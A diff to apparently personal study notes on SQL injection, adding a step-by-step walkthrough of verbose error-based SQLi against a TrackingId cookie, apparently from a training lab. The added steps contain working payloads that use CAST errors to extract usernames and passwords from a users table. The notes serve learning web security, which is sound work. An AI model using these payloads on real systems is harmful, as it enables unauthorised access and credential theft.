@@ -610,6 +610,8 @@ error:
 
 Password is leaked.
 
+### Error itself becomes the output channel
+
 #### When it will work?
 1. DB error is not suppressed.
 2. error messages are returned to client.
@@ -636,3 +638,28 @@ no `case`
 No  `substring`  
 No loops/comparisons  
 direct error is thrown.
+
+### How to perform verbose error based blind SQLi:
+#### Example steps:
+
+1.  `Proxy > HTTP` history tab and find a `GET /` request that contains a `TrackingId cookie`.
+
+2. send the request in the Repeater.
+
+3. check if this request is giving verbose error - insert a single qoute in the end of the trackingID:
+    > TrackingId=ogAZZfxtOKUELbuJ`'`
+
+    if this discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. - **VERBOSE ERROR** 
+
+4. make query syntactically valid.
+    > TrackingId=ogAZZfxtOKUELbuJ`'` `--`
+
+5. Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type:
+    > TrackingId=ogAZZfxtOKUELbuJ`' AND CAST((SELECT 1) AS int)--`
+
+6. Modify the condition to correct the above error.
+    > TrackingId=ogAZZfxtOKUELbuJ`' AND 1=CAST((SELECT 1) AS int)--`
+
+7. get the reuqired username and password:
+    > TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+    > TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
